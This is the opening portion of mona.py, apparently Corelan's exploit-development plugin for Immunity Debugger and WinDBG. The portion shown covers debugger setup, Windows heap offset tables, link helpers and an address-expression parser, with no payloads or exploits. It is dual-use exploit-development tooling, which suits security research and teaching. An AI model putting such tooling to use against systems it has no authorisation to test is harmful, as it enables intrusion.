#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function

"""
 
U{Corelan<https://www.corelan.be>}

Copyright (c) 2011-2026, Peter Van Eeckhoutte - Corelan Consulting bv
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * Neither the name of Corelan nor the
      names of its contributors may be used to endorse or promote products
      derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL PETER VAN EECKHOUTTE OR CORELAN CONSULTING BV 
BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, 
OR CONSEQUENTIAL DAMAGES(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE 
GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) 
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, 
STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY 
WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

$Revision: 3000 $
"""

__VERSION__ = '3.0'
__REV__ = ''.join(filter(str.isdigit, '$Revision: 3000 $'))

DEBUG_MODE = False


## Some Python2/Python3 compatibility stuff

PY3 = __import__("sys").version_info[0] >= 3

try:
	xrange
except NameError:
	xrange = range

try:
	from itertools import izip_longest
except ImportError:
	from itertools import zip_longest as izip_longest

try:
	from urllib import urlretrieve as urllib_urlretrieve
except ImportError:
	from urllib.request import urlretrieve as urllib_urlretrieve


if PY3:
	text_type = str
	bytes_type = bytes
else:
	text_type = unicode
	bytes_type = str


__IMM__ = '1.8'
__DEBUGGERAPP__ = ''
arch = 32
win7mode = False


try:
	import immlib as dbglib
	from immlib import LogBpHook
	__DEBUGGERAPP__ = "Immunity Debugger"
except:		
	try:
		import pykd
		import windbglib as dbglib
		#activate this with -debug flag
		from windbglib import LogBpHook
		dbglib.checkVersion()
		arch = dbglib.getArchitecture()
		__DEBUGGERAPP__ = "WinDBG"
	except SystemExit:
		print("-Exit.")
		import sys
		sys.exit(1)
	except Exception:
		import traceback
		print("Do not run this script outside of a debugger !")
		print(traceback.format_exc())
		import sys
		sys.exit(1)

import getopt

try:
	from immutils import *
except:
	pass

		
import os
import re
import sys
import types
import random
import shutil
import struct
import string
import types
import urllib
import inspect
import datetime
import binascii
import itertools
import traceback
import pickle
import json
from collections import OrderedDict
import bisect
import math
import argparse
import time
import socket

from operator import itemgetter
from collections import defaultdict, namedtuple

import cProfile
import pstats

import copy

DESC = "Corelan Consulting bv exploit development swiss army knife"

#---------------------------------------#
#  Global stuff                         #
#---------------------------------------#	

TOP_USERLAND = 0x7fffffff if arch == 32 else 0x7FFFFFFFFFFF
STACK_POINTER = "esp" if arch == 32 else "rsp"
PROGRAM_COUNTER = "eip" if arch == 32 else "rip"
PTR_SIZE_DIRECTIVE = "dword ptr" if arch == 32 else "qword ptr"
PTR_SIZE = 4 if arch == 32 else 8
PTR_FMT = '<L' if arch == 32 else '<Q'
PTR_PRINT = "0x%08x" if arch == 32 else "0x%016x"
PTR_PRINT_ADDRESSONLY = "%08x" if arch == 32 else "%016x"


Registers32BitsOrder = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]
Registers64BitsOrder = ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi",
						"r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]

global scriptname
currentArgs = []

_teb_addr_cache = None
_peb_addr_cache = None
MemoryPageACL={}

disasmLowerChecked = False
disasmIsLower = False
configFileCache = {}
CFGTableCache = {}
configwarningshown = False
_excluded_modules_list = None
ptr_counter = 0
ptr_to_get = -1
silent = False
noheader = False
g_keystoneLoaded = False
_sym_cache_dirs = None
_heap_cmd_prefix = None

mnproc = None



try:
	import keystone
	g_keystoneLoaded = True
except:
	g_keystoneLoadd = False


###
#
# Some stuff that needs to happen early on
#
###


dbg = dbglib.Debugger()


def _ensureSymbolCache(auto_fix=False):
	"""Check that WinDBG has a valid local symbol cache configured.

	Returns a list of valid local filesystem cache directories.
	If none are found and auto_fix is True, sets a default symbol path.
	If none are found and auto_fix is False, logs a warning and returns [].
	Also populates _sym_cache_dirs for use by showModuleTable.
	"""
	global _sym_cache_dirs
	if __DEBUGGERAPP__ != "WinDBG":
		return []

	raw = dbglib.getSymbolPath().replace(" ", "")
	if raw == "":
		if auto_fix:
			dbg.log("")
			dbg.log("** Warning, no symbol path set ! ** ", highlight=1)
			sympath = "srv*c:\\symbols*https://msdl.microsoft.com/download/symbols"
			dbg.log("   I'll set the symbol path to %s" % sympath)
			dbglib.setSymbolPath(sympath)
			dbg.log("   Symbol path set, now reloading symbols...")
			dbg.nativeCommand(".reload")
			dbg.log("   All set. Please restart WinDBG.")
			dbg.log("")
		else:
			dbg.log("[!] No symbol path configured", highlight=1)
			dbg.log("    Configure a symbol path first, e.g.:")
			dbg.log("    .sympath srv*c:\\symbols*https://msdl.microsoft.com/download/symbols")
			return []

	cache_dirs, servers, sym_entries = dbglib.getSymPaths()
	cache_dirs = [d for d in cache_dirs if d and not d.lower().startswith(("http://", "https://"))]

	if cache_dirs:
		_sym_cache_dirs = cache_dirs

	if not cache_dirs and not auto_fix:
		dbg.log("[!] No valid local symbol cache directory found in .sympath", highlight=1)
		dbg.log("    Configure a symbol path with a local cache, e.g.:")
		dbg.log("    .sympath srv*c:\\symbols*https://msdl.microsoft.com/download/symbols")

	return cache_dirs


def _findSymbolsCached(modprops, cache_dirs=None):
	"""Find a module's cached PDB path.

	Checks next to the binary first, then symbol cache directories.

	Returns: (path_str, label) or (None, None) if not found.
	  label is "local" or "#N" (1-based cache dir index).
	"""
	pdbname = modprops.get("pdbname", "")
	guidage = modprops.get("pdbguidage", "")
	modpath = modprops.get("path", "")
	if modpath and pdbname:
		local_pdb = os.path.join(os.path.dirname(modpath), pdbname)
		if os.path.isfile(local_pdb):
			return local_pdb, "local"
	dirs = cache_dirs if cache_dirs is not None else _sym_cache_dirs
	if dirs is not None and pdbname and guidage:
		for ci, cdir in enumerate(dirs):
			candidate = os.path.join(cdir, pdbname, guidage, pdbname)
			if os.path.isfile(candidate):
				return candidate, "#%d" % (ci + 1)
	return None, None


def _hasSymbolsCached(modprops):
	"""Check if a module's PDB is cached. Returns True/False/None."""
	pdbname = modprops.get("pdbname", "")
	modpath = modprops.get("path", "")
	# Local check doesn't need _sym_cache_dirs
	if modpath and pdbname:
		local_pdb = os.path.join(os.path.dirname(modpath), pdbname)
		if os.path.isfile(local_pdb):
			return True
	if _sym_cache_dirs is None:
		return None
	path, _ = _findSymbolsCached(modprops)
	return path is not None

commands = {}

if __DEBUGGERAPP__ == "WinDBG":
	_ensureSymbolCache(auto_fix=True)

osver = dbg.getOsVersion()
if osver in ["6", "7", "8", "10", "11", "vista", "win7", "2008server", "win8", "win8.1", "win10", "win11"]:
	win7mode = True

# Fallback: parse getOsRelease() for major version >= 6
if not win7mode:
	try:
		_osrel = dbg.getOsRelease()
		if isinstance(_osrel, tuple):
			if int(_osrel[0]) >= 6:
				win7mode = True
		else:
			_parts = str(_osrel).split(".")
			if len(_parts) >= 1 and int(_parts[0]) >= 6:
				win7mode = True
	except:
		pass

# If win7mode still not set, log diagnostics
if not win7mode:
	try:
		dbg.log("[!] win7mode=False. getOsVersion()='%s' (type:%s)" % (str(osver), type(osver).__name__))
		try:
			_r = dbg.getOsRelease()
			dbg.log("[!] getOsRelease()='%s' (type:%s)" % (str(_r), type(_r).__name__))
		except Exception as e:
			dbg.log("[!] getOsRelease() failed: %s" % str(e))
	except:
		pass

heapgranularity = 8
if arch == 64:
	heapgranularity = 16

offset_categories = ["xp", "vista", "win7", "win8", "win10"]

# offset = [x86,x64]
offsets = {
	"Signature" : {
		"xp" : [0x008,0x008],
		"vista" : [0x064,0x0a0],
		"win8" : [0x060,0x098],
	},
	"FrontEndHeap" : {
		"xp" : [0x580,0xad8],
		"vista" : [0x0d4,0x178],
		"win8" : [0x0d0,0x170],
		"win10" : {
			14393 : [0x0d4,0x178],
			17763 : [0x0e4,0x198]
		}
	},
	"FrontEndHeapType" : {
		"xp" : [0x586,0xae2],
		"vista" : [0x0da,0x182],
		"win8" : [0x0d6,0x17a],
		"win10" : {
			14393 : [0x0da,0x182],
			17763 : [0x0ea,0x1a2]
		}
	},
	"VirtualAllocdBlocks" : {
		"xp" : [0x050,0x090],
		"vista" : [0x0a0,0x118],
		"win8" : [0x09c,0x110],
	},
	"SegmentList" : {
		"vista" : [0x0a8,0x128],
		"win8" : [0x0a4,0x120],
	},
	"FreeLists" : {
		"xp" : [0x178,0x178],
		"vista" : [0x0c4,0x138],
		"win8" : [0x0c0,0x130],
	},
	"BlocksIndex" : {
		"vista" : [0x0b8,0x120],
		"win8" : [0x0b4,0x118],
	},
	"FrontEndHeapUsageData" : {
		"vista" : [0x0d8,0x180],
	},
}



#---------------------------------------#
#  Utility functions                    #
#---------------------------------------#	

def dbgp(s, highlight=False, errormode = False):
	# print debug information
	msgprefix = ""
	if errormode:
		msgprefix = " - ERR"
		highlight = True
	if DEBUG_MODE:
		try:
			dbg.log("[MONA DEBUG%s] %s | %s" % (msgprefix, get_current_datetime(),s), highlight=highlight)
		except Exception as e:
			dbg.log("[MONA DEBUG - error] %s | %s" % (get_current_datetime(), str(e)), highlight=True)
			pass


###
# Add WinDBG Clickable links to values
###

def clickCategoryCmd(category_cmd = ""):
	cmdoutstr = category_cmd
	if __DEBUGGERAPP__ == "WinDBG":
		cmdoutstr = "<link cmd=\"%s\">%s</link>" % (category_cmd, category_cmd)
	return cmdoutstr

def clickWinDBGCmd(windbg_cmd = ""):
	cmdoutstr = windbg_cmd
	if __DEBUGGERAPP__ == "WinDBG":
		cmdoutstr = "<link cmd=\"%s\">%s</link>" % (windbg_cmd, windbg_cmd)
	return cmdoutstr


def clickChunkPtr(chunkptr = 0, chunksize = 0, displaytext = ""):
	chunktrstr = ""
	fmtted_ptr = PTR_PRINT % chunkptr
	displaystr = fmtted_ptr
	if not displaytext == "":
		displaystr = displaytext 
	if __DEBUGGERAPP__ == "WinDBG":
		sizearg = ""
		if chunksize > 0:
			sizearg = "-s 0x%x" % chunksize
		chunkptrstr = "<link cmd=\"!mona do -a %s %s\">%s</link>" % (fmtted_ptr,sizearg,displaystr)
	else:
		chunkptrstr = fmtted_ptr
	return chunkptrstr

def clickModuleName(modname = "", displaytext = ""):
	clickstr = modname
	if displaytext == "":
		displaytext = modname
	if __DEBUGGERAPP__ == "WinDBG":
		clickstr = "<link cmd=\"!mona modinfo -m %s\">%s</link>" % (modname, displaytext)
	return clickstr

def clickDisassemble(locstr = ""):
	clickstr = locstr
	if __DEBUGGERAPP__ == "WinDBG" and locstr != "":
		clickstr = "<link cmd=\"u %s L 20\">%s</link>" % (locstr, locstr)
	return clickstr


def clickStackPtr(stackptr = 0):
	stackptrstr = ""
	fmtted_ptr = PTR_PRINT % stackptr
	if __DEBUGGERAPP__ == "WinDBG":
		stackptrstr = "<link cmd=\"!mona pageacl -a %s \">%s</link>" % (fmtted_ptr, fmtted_ptr)
	else:
		stackptrstr = fmtted_ptr
	return stackptrstr

def clickPageAcl(ptrinfo = 0):
	infoptrstr = ""
	fmtted_ptr = PTR_PRINT % ptrinfo
	if __DEBUGGERAPP__ == "WinDBG":
		infoptrstr = "<link cmd=\"!mona pageacl -a %s \">Info</link>" % (fmtted_ptr)
	else:
		infoptrstr = fmtted_ptr
	return infoptrstr

def clickPEB(pebstr = ""):
	pebstrout = pebstr
	if __DEBUGGERAPP__ == "WinDBG":
		pebstrout = "<link cmd=\"dt _PEB @$peb\">%s</link>" % pebstr
	return pebstrout

def clickTEB(tebptr = 0, displaytext = ""):
	tebptrstr = PTR_PRINT % tebptr
	tebptrstr_display = displaytext
	if tebptrstr_display == "":
		tebptrstr_display = tebptrsr
	tebstrout = ""
	if __DEBUGGERAPP__ == "WinDBG":
		tebstrout = "<link cmd=\"dt _TEB %s\">%s</link>" % (tebptrstr, tebptrstr_display)
	return tebstrout

def clickHeapWinDBG(heapbase, heaptype="nt", displaytext=""):
	heapbasestr = PTR_PRINT % heapbase
	heap_display = displaytext
	if heap_display == "":
		heap_display = heapbasestr
	heapstrout = ""
	if __DEBUGGERAPP__ == "WinDBG":
		if heaptype == "nt":
			heapstrout = "<link cmd=\"dt _HEAP %s\">%s</link>" % (heapbasestr, heap_display)
		elif heaptype == "segment":
			heapstrout = "<link cmd=\"dt _SEGMENT_HEAP %s\">%s</link>" % (heapbasestr, heap_display)
	return heapstrout

def clickSegmentWinDBG(segmentbase, heaptype="nt", displaytext=""):
	segmentbasestr = PTR_PRINT % segmentbase
	segment_display = displaytext
	if segment_display == "":
		segment_display = segmentbasestr
	segmentstrout = ""
	if __DEBUGGERAPP__ == "WinDBG":
		if heaptype == "nt":
			segmentstrout = "<link cmd=\"dt _HEAP_SEGMENT %s\">%s</link>" % (segmentbasestr, segment_display)
		elif heaptype == "segment":
			segmentstrout = "<link cmd=\"dt _SEGMENT_HEAP %s\">%s</link>" % (segmentbasestr, segment_display)
	return segmentstrout

def clickMnCommand(commandname=""):
	commandstrout = commandname
	if __DEBUGGERAPP__ == "WinDBG" and commandname != "":
		commandstrout = "<link cmd=\"!mona %s -h\">%s</link>" % (commandname, commandname)
	return commandstrout


### Various utilities

def checkKeystone():
	pyversion = "%d.%d" % (sys.version_info[0], sys.version_info[1])
	if not g_keystoneLoaded:
		if arch==64:
			dbg.log("")
			dbg.log("[!] Warning - keystone engine not loaded", highlight=True)
			dbg.log("    This will severely impact your ability to assemble mnemonics on 64bit", highlight=True)
			dbg.log("    Consider installing the keystone-engine library")
			dbg.log("    Open an administrator command prompt, and run the following command(s):")
			dbg.log("     (select the one(s) that apply to your system setup)") 
			dbg.log("        py -%s -m pip install keystone-engine" % pyversion, highlight=True)
			dbg.log("        py -%s-32 -m pip install keystone-engine" % pyversion, highlight=True)
			dbg.log("        py -%s-64 -m pip install keystone-engine" % pyversion, highlight=True)
			dbg.log("")
		return False
	else:
		dbg.log("[+] keystone-engine version %s loaded successfully" % keystone.__version__)
		dbg.log("")
		return True 


def interruptMona(cleanup = False):
	"""
	Stops mona when a user-created interrupt file is present next to mona.py.
	"""
	if '__file__' in globals():
		script_path = os.path.abspath(__file__)
	elif len(sys.argv) > 0 and sys.argv[0]:
		script_path = os.path.abspath(sys.argv[0])
	else:
		script_path = os.path.join(os.getcwd(), "mona.py")
	script_folder = os.path.dirname(script_path)
	for interrupt_file in ("stop", "break", "interrupt"):
		interrupt_path = os.path.join(script_folder, interrupt_file)
		if os.path.isfile(interrupt_path):
			try:
				os.remove(interrupt_path)
			except Exception:
				pass
			if not cleanup:
				dbg.log("")
				dbg.log("[!] Script interrupted by user intervention, file found: %s" % interrupt_path, highlight=True)
				dbg.log("")
				sys.exit(0)


def resetGlobals():
	"""
	Clears all process-level caches and resets mona globals.
	Sets mnproc to None so it will be re-created lazily on next access.
	"""
	global currentArgs
	global disasmLowerChecked
	global mnproc
	global _excluded_modules_list
	global CFGTableCache

	mnproc = None
	currentArgs = None
	disasmLowerChecked = False
	_excluded_modules_list = None
	CFGTableCache = {}
	return


_creating_mnproc = False

def _ensureMnProc(entities=None, include_chunks=False):
    """Lazily create MnProc and optionally populate selected entities.

    A module-level flag prevents re-entrant calls during MnProc.__init__
    (e.g. from MnPEB -> MnModule -> ModInfoCached) from creating additional
    MnProc instances, which would cause unbounded recursion.
    """
    global mnproc, _creating_mnproc

    if mnproc is None:
        if _creating_mnproc:
            # Re-entrant call during MnProc construction — return None safely.
            return None

        _creating_mnproc = True
        try:
            mnproc = MnProc()
        except Exception as e:
            # Note: 'dbg' and 'dbgp' must be defined elsewhere in your code
            dbg.log("[!] Are you connected to a process?", highlight=1)
            dbgp("Error creating MnProc instance: %s" % str(e), errormode=False)
            dbgp("Exception details:\n%s" % traceback.format_exc(), errormode=False)
            mnproc = None
        finally:
            _creating_mnproc = False

    if mnproc is not None:
        if entities is not None:
            mnproc.populate(entities=entities, include_chunks=include_chunks)
        return mnproc

    return None


def getRegisters():
	# On Immunity, the register names are uppercase
	# but we prefer lowercase
    regs = dbg.getRegs()
    return {reg.lower(): val for reg, val in regs.items()}


def getAllRegisters():
	"""
	Makes a dict of all valid registers and their values on the current architecture
	"""
	dbgp(get_current_function_name())
	if __DEBUGGERAPP__ == "Immunity Debugger":
		return getRegisters()
	else:
		return dbg.getRegs()


def _safe_int(v):
	try:
		return int(str(v).strip().replace("'", "").replace('"', ""))
	except:
		return 0


def _ord(x):
    if isinstance(x, int):
        return x

    if isinstance(x, bytes):
        # Python3: b"A"[0] -> 65
        # Python2: b"A"[0] -> "A"
        return x[0] if PY3 else ord(x[0])

    return ord(x)

def _to_text(value):
	if isinstance(value, text_type):
		return value
	if isinstance(value, bytes_type):
		return value.decode('latin1')
	return text_type(value)


def _to_bytes(value):
	if isinstance(value, bytes_type):
		return value
	if isinstance(value, text_type):
		return value.encode('latin1')
	return text_type(value).encode('latin1')


def _normalize_single_fill_byte(fillvalue):
	"""Normalize fill input to exactly one byte, Python 2/3 compatible."""
	if isinstance(fillvalue, int):
		return struct.pack('B', fillvalue & 0xff)
	fillbyte = _to_bytes(fillvalue)
	if len(fillbyte) == 0:
		return b""
	return fillbyte[:1]


def str_to_bool(value):
    """
    Convert a string (or other value) to boolean.

    True values:
        t, true, yes, y, 1, +, on
    False values:
        f, false, no, n, 0, -, off

    Case-insensitive, ignores leading/trailing spaces.
    """

    if value is None:
        return False

    # Already boolean
    if isinstance(value, bool):
        return value

    # Convert to string safely (py2/py3)
    try:
        value = str(value)
    except:
        return False

    val = value.strip().lower()

    true_values = set(["t", "true", "yes", "y", "1", "+", "on"])
    false_values = set(["f", "false", "no", "n", "0", "-", "off"])

    if val in true_values:
        return True
    if val in false_values:
        return False

    # fallback: try numeric interpretation
    try:
        return float(val) != 0
    except:
        return False
	

def get_script_name():
    if '__file__' in globals():
        return os.path.splitext(os.path.basename(__file__))[0]
    if len(sys.argv) > 0:
        return os.path.splitext(os.path.basename(sys.argv[0]))[0]
    return "unknown"


def get_current_function_name():

    frame = inspect.currentframe()
    try:
        current_frame = frame.f_back
        parent_frame  = current_frame.f_back if current_frame else None

        # Current function
        current_name = current_frame.f_code.co_name if current_frame else "???()"

        args, _, _, values = inspect.getargvalues(current_frame)
        callerargs = {arg: values[arg] for arg in args}

        # Parent function
        parent_name = parent_frame.f_code.co_name if parent_frame else "???()"

        return "--- %s() -> %s(%s)" % (parent_name, current_name, callerargs)

    finally:
        del frame	


def get_current_datetime():
	return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))

def get_current_datetime_flat():
	return time.strftime("%Y%m%d-%H%M%S", time.localtime(time.time()))


def getPythonVersion():
	versioninfo = sys.version
	versioninfolines = versioninfo.split('\n')
	return versioninfolines[0]


def ensure_bytes(s, encoding='latin-1'):
	if isinstance(s, bytes):
		return s
	return s.encode(encoding)

def ensure_text(s, encoding='latin-1'):
	if isinstance(s, str):
		return s
	return s.decode(encoding)	


def toHex(n):
	"""
	Converts a numeric value to hex (pointer to hex)

	Arguments:
	n - the value to convert

	Return:
	A string, representing the value in hex (8 characters long)
	"""
	if arch == 32:
		return "%08x" % n
	if arch == 64:
		return "%016x" % n

def sanitize_module_name(modname):
	"""
	Sanitizes a module name so it can be used as a variable
	"""
	return modname.replace(".", "_")


def DwordToBits(srcDword):
	"""
	Converts a dword into an array of 32 bits
	"""
	bit_array = []
	h_str = "%08x" % srcDword
	h_size = len(h_str) * 4
	bits = (bin(int(h_str,16))[2:]).zfill(h_size)[::-1]
	for bit in bits:
		bit_array.append(int(bit))
	return bit_array



def print_dict_table(data, headers, types, ptr_size=None, padding="", itemsequence=None, logobj=None, logfile=None, key_col=None):
	"""
	Prints a table from a dict, Python 2/3 compatible.

	padding : string to prepend to every printed line
	logobj  : optional MnLog object for file output
	logfile : optional filename (used with logobj.write())
	"""

	if itemsequence is None:
		printsequence = []
	else:
		printsequence = list(itemsequence)

	if ptr_size is None:
		ptr_size = 16 if sys.maxsize > 2**32 else 8

	if len(headers) != len(types):
		raise ValueError("headers and types must have the same number of elements")

	def _pointer_to_int(v):
		try:
			if isinstance(v, bytes):
				v = v.decode("latin-1", "replace")
			if isinstance(v, str):
				return int(v, 0)
			return int(v)
		except Exception:
			return None

	def _ensure_text(v):
		if v is None:
			return ""
		if sys.version_info[0] >= 3:
			if isinstance(v, bytes):
				try:
					return v.decode("latin-1", "replace")
				except:
					return repr(v)
			return str(v)
		else:
			if isinstance(v, unicode):
				try:
					return v.encode("latin-1", "replace")
				except:
					return repr(v)
			return str(v)

	def _format_value(v, vtype):
		if v is None:
			return ""

		vtype = vtype.lower()

		if vtype == "pointer":
			try:
				ival = int(v)
				return "0x%0*X" % (ptr_size, ival)
			except:
				return _ensure_text(v)

		if vtype == "size":
			try:
				ival = int(v)
				return "0x%x" % (ival)
			except:
				return _ensure_text(v)

		elif vtype == "int":
			try:
				return str(int(v))
			except:
				return _ensure_text(v)

		elif vtype == "bytes":
			if sys.version_info[0] >= 3:
				if isinstance(v, bytes):
					try:
						return v.decode("latin-1", "replace")
					except:
						return repr(v)
				return str(v)
			else:
				if isinstance(v, str):
					return v
				return str(v)

		elif vtype == "string":
			return _ensure_text(v)

		else:
			return _ensure_text(v)

	def _format_cell(v, vtype, col_idx):
		formatted = _format_value(v, vtype)
		if __DEBUGGERAPP__ == "WinDBG" and col_idx == 0:
			return "<b>%s</b>" % formatted
		return formatted

	def _normalize_row(key, value):
		if isinstance(value, (list, tuple)):
			return [key] + list(value)
		return [key, value]

	raw_rows = []
	formatted_rows = []
	expected_cols = len(headers)

	if len(printsequence) == 0:
		printsequence = list(data.keys())

	for _pdt_i, key in enumerate(printsequence):
		if key in data:
			value = data[key]
			col0 = key_col[_pdt_i] if key_col is not None else key
			row = _normalize_row(col0, value)

			if len(row) != expected_cols:
				raise ValueError(
					"Row for key %r has %d columns, expected %d"
					% (key, len(row), expected_cols)
				)

			raw_rows.append(row)
			formatted_rows.append([
				_format_cell(row[i], types[i], i) for i in range(expected_cols)
			])
		else:
			dbg.log("key %s not present" % key)
			dbg.log("%s" % data)
	col_widths = []

	def _display_len(v):
		txt = _ensure_text(v)
		if txt.startswith("<b>") and txt.endswith("</b>"):
			txt = txt[3:-4]
		if "link cmd" in txt:
			start = txt.find(">")
			if start != -1:
				end = txt.find("</cmd>", start + 1)
				if end == -1:
					end = txt.find("</link>", start + 1)
				if end != -1:
					return len(txt[start + 1:end])
		return len(txt)

	for i in range(expected_cols):
		max_value_width = 0
		for row in formatted_rows:
			max_value_width = max(max_value_width, _display_len(row[i]))
		header_width = len(_ensure_text(headers[i]))
		col_widths.append(max(max_value_width, header_width + 1))

	def _pad_cell(v, width, align_right=False):
		txt = _ensure_text(v)
		padding = " " * max(0, width - _display_len(txt))
		if align_right:
			return padding + txt
		return txt + padding

	def _render_row(values, align_right_cols=None):
		if align_right_cols is None:
			align_right_cols = set()
		return "   ".join([
			_pad_cell(values[i], col_widths[i], i in align_right_cols) for i in range(expected_cols)
		])

	right_align_cols = set([i for i in range(expected_cols) if types[i].lower() == "size"])

	def _p(line):
		dbg.log("%s%s" % (padding, line))
		if logobj is not None and logfile is not None:
			logobj.write("%s%s" % (padding, line), logfile)

	_p(_render_row([_ensure_text(h) for h in headers]))
	_p(_render_row([("-" * w) for w in col_widths]))

	for raw_row, row in zip(raw_rows, formatted_rows):
		line = _render_row([_ensure_text(c) for c in row], align_right_cols=right_align_cols)
		if len(types) > 0 and types[0].lower() == "pointer" and not __DEBUGGERAPP__ == "WinDBG":
			addr_val = _pointer_to_int(raw_row[0])
			if addr_val is not None:
				dbg.log("%s%s" % (padding, line), address=addr_val)
				if logobj is not None and logfile is not None:
					logobj.write("%s%s" % (padding, line), logfile)
				continue
		_p(line)



def getDisasmInstruction(disasmentry):
	""" returns instruction string, convert to lower if needed """
	global disasmLowerChecked
	global disasmIsLower
	instrline = disasmentry.getDisasm()
	if disasmLowerChecked:
		if not disasmIsLower:
			instrline = instrline.lower()
	else:
		disasmLowerChecked = True
		interim_instr = instrline.lower()
		if interim_instr == instrline:
			disasmIsLower = True
		else:
			disasmIsLower = False
			instrline = instrline.lower()
	return instrline
	

def multiSplit(thisarg,delimchars):
	""" splits a string into an array, based on provided delimeters"""
	splitparts = []
	thispart = ""
	for c in str(thisarg):
		if c in delimchars:
			thispart = thispart.replace(" ","")
			if thispart != "":
				splitparts.append(thispart)
			splitparts.append(c)
			thispart = ""
		else:
			thispart += c
	if thispart != "":
		splitparts.append(thispart)
	return splitparts

	

def getAddyArg(argaddy):
	"""
	Tries to extract an address from a specified argument
	addresses and values will be considered hex
	(unless you specify 0n before a value)
	registers, module names, module!function names and
	WinDBG symbols are allowed too
	"""
	findval = 0
	addyok = True
	addyparts = []
	addypartsint = []
	delimchars = ["-","+","*","/","(",")","&","|",">","<"]
	regs = getAllRegisters()
	dbgp("getAddyArg parser: supports 0x.. / ..h hex and 0n.. / ..n decimal")

	def _tokenize_addy_expression(expr):
		parts = []
		thispart = ""
		bracketlevel = 0
		for c in str(expr):
			if c == "[":
				bracketlevel += 1
				thispart += c
				continue
			if c == "]":
				if bracketlevel > 0:
					bracketlevel -= 1
				thispart += c
				continue
			if c in delimchars and bracketlevel == 0:
				thispart = thispart.replace(" ","")
				if thispart != "":
					parts.append(thispart)
				parts.append(c)
				thispart = ""
			else:
				thispart += c
		if thispart != "":
			parts.append(thispart)
		return parts

	def _resolve_part(part):
		partclean = str(part).strip()
		partlower = partclean.lower()

		if partclean == "":
			return 0, False

		if partlower in regs:
			return regs[partlower], True

		if partlower == "heap" or partlower == "processheap":
			return getDefaultProcessHeap(), True

		if partclean.startswith("[") and partclean.endswith("]"):
			ptraddy, ptraddyok = getAddyArg(partclean[1:-1])
			if ptraddyok:
				try:
					ptrval = struct.unpack(PTR_FMT, dbg.readMemory(ptraddy, PTR_SIZE))[0]
					dbgp("Dereferenced address %s, got value %s" % ((PTR_PRINT % ptraddy), (PTR_PRINT % ptrval)))
					return ptrval, True
				except Exception:
					dbgp("Unable to dereference address %s, I tried reading %d bytes" % ((PTR_PRINT % ptraddy), PTR_SIZE), errormode=False)
					return 0, False
			return 0, False

		if partlower.startswith("0n"):
			try:
				decval = int(partlower.replace("0n", "", 1))
				dbgp("  Detected decimal prefix 0n, value: %d" % decval)
				return decval, True
			except:
				pass
		else:
			# Accept decimal constants ending in 'n', e.g. 10n.
			if partlower.endswith("n") and len(partlower) > 1 and partlower[:-1].isdigit():
				decval = int(partlower[:-1])
				dbgp("  Detected decimal suffix n, value: %d" % decval)
				return decval, True

			hexpart = partlower.replace("0x", "", 1)
			# Accept MASM-style hex constants ending in 'h', e.g. 0Ch / 10h.
			# To avoid ambiguity with symbols/module names, only treat as hex when it starts with a digit.
			if hexpart.endswith("h") and len(hexpart) > 1 and hexpart[0].isdigit():
				dbgp("  Detected hex suffix h, normalized %s -> %s" % (hexpart, hexpart[:-1]))
				hexpart = hexpart[:-1]
			dbgp("Check if hexparts %s is an address" % hexpart)
			if isAddress(hexpart):
				dbgp("Yes, returning %s, True" % (PTR_PRINT % hexStrToInt(hexpart)))
				return hexStrToInt(hexpart), True

		m = getModuleObj(partclean)
		if not m == None:
			return m.moduleBase, True

		if "!" in partclean:
			modparts = partclean.split("!", 1)
			if len(modparts) > 1:
				funcaddy = getFunctionAddress(modparts[0], modparts[1])
				if funcaddy > 0:
					return funcaddy, True

		if __DEBUGGERAPP__ == "WinDBG":
			try:
				symboladdy = dbg.resolveSymbol(partclean)
				if symboladdy != "":
					symboladdy = str(symboladdy).strip().replace("`", "").replace("0x", "", 1)
					if isAddress(symboladdy):
						return hexStrToInt(symboladdy), True
			except:
				pass
		
		dbgp("Unable to resolve part %s as register, module, symbol or address. Return False" % partclean)
		return 0, False

	if str(argaddy).strip().lower() in regs:
		thisreg = str(argaddy).strip().lower()
		dbgp("Argument %s is a register, value: %s" % (argaddy, PTR_PRINT % regs[thisreg]))
		return regs[thisreg], True

	argaddy = str(argaddy).strip().replace("`","")
	addyparts = _tokenize_addy_expression(argaddy)
	dbgp("Tokenized addy expression: %s" % addyparts)

	partok = False
	for part in addyparts:
		if not part in delimchars:
			cleaned = str(part).strip()
			dbgp("Trying to resolve part %s" % cleaned)
			partval,partok = _resolve_part(cleaned)
			dbgp("  Resolved %s into %s, Success: %s" % (cleaned, PTR_PRINT % partval, partok))
			if not partok:
				break
			addypartsint.append(partval)
		else:
			addypartsint.append(part)
			partok = True
		if not partok:
			break


	if not partok:
		addyok = False
		findval = 0
	else:
		calcstr = "".join(str(x) for x in addypartsint)
		try:
			findval = eval(calcstr)
			addyok = True
		except:
			findval = 0
			addyok = False

	return findval, addyok
	



def getHeapAllocSize(requested_size, granularity = 8):
	"""
	Returns the expected allocated size for a request of X bytes of heap memory
	taking a certain granularity into account
	"""
	
	requested_size_int = to_int(requested_size)
	interimval = (requested_size_int // granularity) * granularity
	interimtimes = (requested_size_int // granularity)
	if (interimval < requested_size_int):
		interimtimes += 1
